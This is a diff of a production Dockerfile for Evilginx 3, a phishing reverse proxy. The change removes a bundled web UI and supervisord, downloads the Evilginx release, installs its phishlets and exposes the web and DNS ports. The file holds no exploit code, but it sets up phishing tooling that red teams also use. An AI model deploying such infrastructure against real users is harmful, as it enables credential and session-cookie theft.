@@ -1,6 +1,5 @@
 # ─────────────────────────────────────────────────────────────────────────────
-# Evilginx 3 + Web UI — Single Container Production Dockerfile
-# Runs both Evilginx proxy and Web UI dashboard in one container
+# Evilginx 3 — Production Dockerfile
 # ─────────────────────────────────────────────────────────────────────────────
 
 FROM python:3.11-slim
@@ -11,7 +10,7 @@ ARG EVILGINX_TAG=v3.3.0
 # ── Install runtime dependencies ─────────────────────────────────────────────
 RUN apt-get update && \
     apt-get install -y --no-install-recommends \
-        curl ca-certificates python3 unzip supervisor && \
+        curl ca-certificates python3 unzip dos2unix && \
     rm -rf /var/lib/apt/lists/*
 
 # ── Download and unpack Evilginx ─────────────────────────────────────────────
@@ -19,25 +18,15 @@ WORKDIR /opt/evilginx
 RUN curl -fsSL "https://github.com/kgretzky/evilginx2/releases/download/${EVILGINX_TAG}/evilginx-${EVILGINX_TAG}-linux-64bit.zip" \
     -o evilginx.zip && \
     unzip -o evilginx.zip && \
+    ls -la evilginx && \
     chmod +x evilginx && \
     mv evilginx /usr/local/bin/evilginx && \
+    /usr/local/bin/evilginx -h && \
     rm -rf /opt/evilginx
 
-# ── Create non-root users ────────────────────────────────────────────────────
+# ── Create non-root user ────────────────────────────────────────────────────
 RUN addgroup --system evilginx && \
-    adduser --system --ingroup evilginx --no-create-home --shell /usr/sbin/nologin evilginx && \
-    addgroup --system ui && \
-    adduser --system --ingroup ui --no-create-home --shell /usr/sbin/nologin ui
-
-# ── Install Python dependencies for Web UI ───────────────────────────────────
-COPY ui_requirements.txt /tmp/ui_requirements.txt
-RUN pip install --no-cache-dir -r /tmp/ui_requirements.txt && \
-    rm /tmp/ui_requirements.txt
-
-# ── Copy Web UI application ──────────────────────────────────────────────────
-COPY ui/ /app/ui/
-COPY ui_config.py /app/ui_config.py
-RUN chown -R ui:ui /app
+    adduser --system --ingroup evilginx --no-create-home --shell /usr/sbin/nologin evilginx
 
 # ── Copy phishlets from Evilginx release ─────────────────────────────────────
 RUN mkdir -p /tmp/evilginx-phishlets && \
@@ -50,20 +39,16 @@ RUN mkdir -p /tmp/evilginx-phishlets && \
     rm -rf /tmp/evilginx-phishlets /tmp/evilginx.zip
 
 # ── Create config directories ────────────────────────────────────────────────
-RUN mkdir -p /config/phishlets /config/certs /config/logs /app/ui/templates /app/ui/static/css /app/ui/static/js && \
-    chown -R evilginx:evilginx /config && \
-    chown -R ui:ui /app/ui
+RUN mkdir -p /config/phishlets /config/certs /config/logs && \
+    chown -R evilginx:evilginx /config
 
-# ── Copy entrypoint and supervisor config ────────────────────────────────────
+# ── Copy entrypoint ──────────────────────────────────────────────────────────
 COPY evilginx-entrypoint.sh /usr/local/bin/evilginx-entrypoint.sh
-COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf
-RUN chmod +x /usr/local/bin/evilginx-entrypoint.sh
+RUN dos2unix /usr/local/bin/evilginx-entrypoint.sh && \
+    chmod +x /usr/local/bin/evilginx-entrypoint.sh
 
 # ── Expose ports ─────────────────────────────────────────────────────────────
-# 80, 443 = Evilginx proxy
-# 53 = DNS (optional)
-# 5000 = Web UI
-EXPOSE 80 443 53/udp 5000
+EXPOSE 80 443 53/udp
 
 # ── Default command ──────────────────────────────────────────────────────────
-CMD ["/usr/bin/supervisord", "-c", "/etc/supervisor/conf.d/supervisord.conf"]
+ENTRYPOINT ["/usr/local/bin/evilginx-entrypoint.sh"]
